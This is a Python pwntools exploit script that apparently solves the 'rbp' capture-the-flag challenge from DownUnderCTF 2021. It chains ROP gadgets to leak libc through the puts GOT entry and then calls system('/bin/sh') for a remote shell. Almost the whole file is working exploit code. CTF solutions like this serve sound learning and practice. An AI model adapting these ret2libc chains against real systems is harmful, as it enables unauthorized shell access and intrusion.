#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host pwn-2021.duc.tf --port 31910 ./rbp
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./rbp_patched')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'pwn-2021.duc.tf'
port = int(args.PORT or 31910)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b *0x40123e
b *0x000000000040120c
continue
c
c
c
c
c
c
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()


libc = exe.libc

print_to = 0x00000000004011f1

bss = 0x404100+0x900
main = 0x00000000004011d5

puts_got = exe.got['puts']

pop_2 = 0x00000000004012b0
pop_rbp_2 = 0x00000000004012af
pop_rbp_4 = 0x00000000004012ab
pop_rdi = 0x00000000004012b3


p =''
p += p64(main)
p += p64(print_to)
p += p64(print_to)
io.sendafter("? ",str(p))
p = '-40'
io.sendafter("? ",str(p))

p =''
p += p64(main)
p += p64(pop_rbp_2)
io.sendafter("? ",str(p))
p = '-40'
io.sendafter("? ",str(p))

p =''
p += p64(pop_rdi)
p += p64(puts_got)
p += p64(pop_2)
io.sendafter("? ",str(p))
p = '-40'
io.sendafter("? ",str(p))

leak = u64(io.recv(8).ljust(8,"\x00"))
print hex(leak)
libc.address = leak - libc.sym['puts']
print hex(libc.address)
system = libc.sym['system']
bin_sh = libc.search("/bin/sh").next()

# p =''
# p += p64(system)
# p += p64(main)
# p += p64(system)
# io.send(p)

# p =''
# p += p64(bss)
# p += p64(pop_rdi)
# p += p64(bin_sh)
# io.sendafter("? ",str(p))

# p = '-32'
# io.sendafter("? ",str(p))

p =''
p += p64(main)
io.send(p)

p = '24'
io.sendafter("? ",str(p))

p =''
p += p64(pop_rdi)
p += p64(bin_sh)
p += p64(system)
io.sendafter("? ",str(p))

p = '-40'
io.sendafter("? ",str(p))


io.interactive()

